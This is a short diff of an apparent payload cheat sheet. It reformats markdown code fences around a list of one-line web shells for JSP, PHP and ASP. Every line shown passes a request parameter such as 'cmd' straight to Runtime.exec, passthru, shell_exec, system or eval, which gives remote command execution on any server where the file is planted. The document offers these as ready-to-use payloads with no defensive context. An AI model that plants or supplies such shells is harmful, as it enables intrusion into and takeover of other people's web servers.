@@ -1,10 +1,11 @@
 
 JSP
-```
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```shell
-PHP
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
+
+PHP
+```shell
 <?php echo passthru($_GET['cmd']); ?>
 
 <?php echo shell_exec($_GET['cmd']); ?>
@@ -16,9 +17,9 @@ PHP
 <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
 
 <?php system($_GET['cmd']);?>
-```shell
+```
 
 ASP
-```
-<% eval request("cmd") %>
 ```shell
+<% eval request("cmd") %>
+```
